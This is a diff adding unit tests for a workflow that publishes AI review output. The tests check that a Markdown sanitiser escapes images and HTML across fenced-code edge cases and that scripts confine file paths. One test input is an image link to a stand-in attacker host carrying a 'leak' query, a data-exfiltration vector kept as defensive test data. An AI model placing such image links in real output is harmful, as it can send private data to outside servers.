@@ -1445,6 +1445,99 @@ class ClaudeActionsWorkflowTests(unittest.TestCase):
         self.assertIn("**text**", cleaned)
         self.assertIn("[a link](https://ok/)", cleaned)
 
+    def test_no_rendered_line_escapes_the_sanitiser(self) -> None:
+        # The invariant that matters is not "images are escaped somewhere" but: every
+        # line Markdown will actually render must have been sanitised. An earlier
+        # version normalised every fence to three characters, so a four-backtick open
+        # could be "closed" by three and reopened by four -- Markdown left the code
+        # block while the scanner believed it was still inside, and the rest was
+        # published raw.
+        publisher = _load_script(PUBLISHER)
+        tick = "`"
+
+        def rendered_lines(text: str) -> list[str]:
+            """Return the lines CommonMark would render, tracked independently."""
+            inside: tuple[str, int] | None = None
+            visible: list[str] = []
+            for line in text.splitlines():
+                match = re.match(r"\A {0,3}(`{3,}|~{3,})(.*)\Z", line)
+                run = match.group(1) if match else ""
+                rest = match.group(2) if match else ""
+                if inside is None:
+                    if match and not (run[0] == "`" and "`" in rest):
+                        inside = (run[0], len(run))
+                        continue
+                    visible.append(line)
+                else:
+                    character, length = inside
+                    if (
+                        match
+                        and run[0] == character
+                        and len(run) >= length
+                        and not rest.strip()
+                    ):
+                        inside = None
+            return visible
+
+        cases = {
+            "four then three then four": [
+                tick * 4,
+                "harmless",
+                tick * 3,
+                tick * 4,
+                "![](https://attacker/?q=leak)",
+            ],
+            "tilde fence with backticks inside": [
+                "~~~",
+                tick * 3,
+                "![](https://inside/)",
+                "~~~",
+                "![](https://outside/)",
+            ],
+            "close with trailing text is not a close": [
+                tick * 3,
+                tick * 3 + " evil",
+                "![](https://inside/)",
+                tick * 3,
+                "![](https://outside/)",
+            ],
+            "indented fence": [
+                "   " + tick * 3,
+                "![](https://inside/)",
+                "   " + tick * 3,
+                "![](https://outside/)",
+            ],
+            "never closed": [tick * 3, "![](https://inside/)"],
+            # CommonMark says a backtick fence's info string may not contain a
+            # backtick, so this line is not a fence and what follows renders.
+            "backtick in the info string": [
+                tick * 3 + "x" + tick,
+                "![](https://outside/)",
+            ],
+            # A tab is four columns of indent, so this is indented code, not a fence.
+            "tab-indented run": ["\t" + tick * 3, "![](https://outside/)"],
+            "over-indented run": ["    " + tick * 3, "![](https://outside/)"],
+        }
+        for name, lines in cases.items():
+            with self.subTest(case=name):
+                raw = "\n".join(lines)
+                cleaned = publisher.neutralise(raw)
+                for line in rendered_lines(cleaned):
+                    self.assertNotRegex(
+                        line, r"(?<!\\)!\[", f"{name}: a rendered line kept an image"
+                    )
+                    self.assertNotIn("<", line, f"{name}: a rendered line kept HTML")
+                # Control: the same oracle must find the vector in the raw text, or the
+                # case is not exercising anything.
+                if "outside" in raw or "leak" in raw:
+                    self.assertTrue(
+                        any(
+                            re.search(r"(?<!\\)!\[", line)
+                            for line in rendered_lines(raw)
+                        ),
+                        f"{name}: the raw input rendered no image, so this proves nothing",
+                    )
+
     def test_fenced_code_is_left_readable(self) -> None:
         # Nothing inside a fence renders, and a report about code is unreadable if its
         # code is escaped.
@@ -1496,6 +1589,77 @@ class ClaudeActionsWorkflowTests(unittest.TestCase):
             # A malformed file reports that, rather than publishing nothing.
             path.write_text("not json", encoding="utf-8")
             self.assertIn("unavailable", publisher.render(path))
+
+    def test_every_review_context_script_confines_its_paths(self) -> None:
+        # These scripts take their paths from the workflow, which is trusted. The value
+        # is still checked where it is used: a later workflow edit must not be able to
+        # point a collector or the publisher outside the runner area it belongs to.
+        for script, variable in (
+            (BASE_COLLECTOR, "GITHUB_WORKSPACE"),
+            (CHUNKER, "GITHUB_WORKSPACE"),
+            (PUBLISHER, "RUNNER_TEMP"),
+        ):
+            # The publisher's *summary* path is deliberately not held to a root -- see
+            # the test below -- but its execution file is.
+            module = _load_script(script)
+            with (
+                self.subTest(script=script.name),
+                tempfile.TemporaryDirectory() as root,
+            ):
+                inside = pathlib.Path(root) / "within"
+                inside.mkdir()
+                previous = os.environ.get(variable)
+                os.environ[variable] = root
+                try:
+                    self.assertEqual(
+                        inside.resolve(),
+                        module._within(str(inside), variable, must_exist=True),
+                    )
+                    for refused in ("/etc", "/", str(pathlib.Path(root).parent)):
+                        with self.subTest(refused=refused):
+                            with self.assertRaises(ValueError):
+                                module._within(refused, variable, must_exist=True)
+                    # A path that does not exist is refused rather than created.
+                    with self.assertRaises(ValueError):
+                        module._within(
+                            str(inside / "absent"), variable, must_exist=True
+                        )
+                finally:
+                    if previous is None:
+                        del os.environ[variable]
+                    else:
+                        os.environ[variable] = previous
+
+    def test_the_summary_path_is_checked_without_pinning_a_root(self) -> None:
+        # GITHUB_STEP_SUMMARY lives under RUNNER_TEMP on today's hosted runners, but
+        # that is an implementation detail: refusing the report because the runner moved
+        # a file would lose the review over an assumption about its layout.
+        publisher = _load_script(PUBLISHER)
+        with (
+            tempfile.TemporaryDirectory() as root,
+            tempfile.TemporaryDirectory() as elsewhere,
+        ):
+            previous = os.environ.get("RUNNER_TEMP")
+            os.environ["RUNNER_TEMP"] = root
+            try:
+                outside = pathlib.Path(elsewhere) / "summary.md"
+                # Accepted although it sits outside RUNNER_TEMP ...
+                self.assertEqual(
+                    outside.resolve(),
+                    publisher._within(str(outside), "", must_exist=False),
+                )
+                # ... but a path whose parent does not exist is still refused.
+                with self.assertRaises(ValueError):
+                    publisher._within(
+                        str(pathlib.Path(elsewhere) / "absent" / "summary.md"),
+                        "",
+                        must_exist=False,
+                    )
+            finally:
+                if previous is None:
+                    del os.environ["RUNNER_TEMP"]
+                else:
+                    os.environ["RUNNER_TEMP"] = previous
 
     def test_deny_rules_cover_every_granted_filesystem_tool(self) -> None:
         # A Read deny rule does not constrain Grep: ripgrep would return matching
